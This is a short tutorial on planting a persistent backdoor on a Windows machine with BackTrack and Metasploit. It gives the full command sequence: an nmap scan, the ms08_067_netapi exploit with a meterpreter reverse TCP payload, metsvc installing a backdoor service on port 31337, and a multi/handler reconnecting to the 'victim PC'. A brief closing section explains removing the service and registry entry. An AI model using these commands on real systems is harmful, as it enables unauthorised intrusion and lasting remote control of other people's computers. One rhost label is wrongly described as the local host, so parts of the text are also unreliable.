How to Create Backdoor in Remote PC (metsvc Tutorial)

Open your backtrack Terminal and type nmap –sV 192.168.1.56
The results above are showing that the port 445 is open so we will try to use the netapi exploit.
The microsoft-ds are a very common service in Windows machines. Most of the servers will have this service enabled so it will be very easy to exploit them except if they are using a firewall that filters the port 445.

Open backtrack terminal and type msfconsole

Now Type “Search “netapi “command in the console, this command will search for the entire exploit modules with the pattern”netapi“

Now type use exploit/windows/smb/ms08_067_netapi
Msf exploit (ms08_067_netapi)>set payload windows/meterpreter/reverse_tcp
Msf exploit (ms08_067_netapi)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (ms08_067_netapi)>set rhost 192.168.1.56 (IP of Local Host)
Msf exploit (ms08_067_netapi)>exploit
Now you can get access of victim pc

Now type metsvc –A This command will upload some files and it will create a windows service on the remote machine
The backdoor will run on port 31337

Now we will reboot the system.
Now Open backtrack terminal type msfconsole
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set rhost 192.168.1.56 (IP of Victim PC)
set lport 31337
exploit 
Now you can access meterpreter shell on victim computer.

Open your run dialog box and type services.msc
Search for meterpreter.
Right Click on meterpreter and stop the services

Now open windows registry editor and find metsvc

Right Click on metsvc-server and Delete registry value.

Now Reboot your PC. Backdoor is successfully removed in your PC
